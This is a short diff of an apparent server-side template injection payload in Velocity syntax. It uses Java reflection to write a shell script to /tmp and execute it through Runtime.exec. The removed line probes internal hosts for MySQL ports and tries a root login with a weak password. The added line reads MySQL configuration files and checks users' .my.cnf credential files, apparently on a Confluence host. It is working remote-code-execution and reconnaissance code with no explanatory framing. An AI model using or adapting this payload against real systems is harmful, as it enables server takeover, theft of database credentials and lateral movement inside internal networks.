@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===T74===; timeout 6 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.74/3306' 2>/dev/null && echo TCPOK || echo TCPNO; echo ===L74===; timeout 12 mysql --connect-timeout=4 -h10.18.19.74 -P3306 -uroot -p123456 -e 'show databases' 2>&1 | head -20; echo ===T24===; timeout 6 bash -c 'cat < /dev/null > /dev/tcp/10.18.24.16/3310' 2>/dev/null && echo TCPOK || echo TCPNO")
+$w2.write("echo ===MYCNF===; cat /etc/my.cnf 2>/dev/null | head -30; echo ===MYCNFDIR===; ls /etc/mysql 2>/dev/null | head; cat /etc/mysql/my.cnf 2>/dev/null | head -10; echo ===RETEST43===; timeout 5 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.43/3307' 2>/dev/null && echo 43-3307-OK || echo 43-3307-NO; timeout 5 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.42/3307' 2>/dev/null && echo 42-3307-OK || echo 42-3307-NO; echo ===HOME.CNF===; ls -la /home/confluence/.my.cnf /home/dradmin/.my.cnf /home/druser/.my.cnf 2>&1 | head -5")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
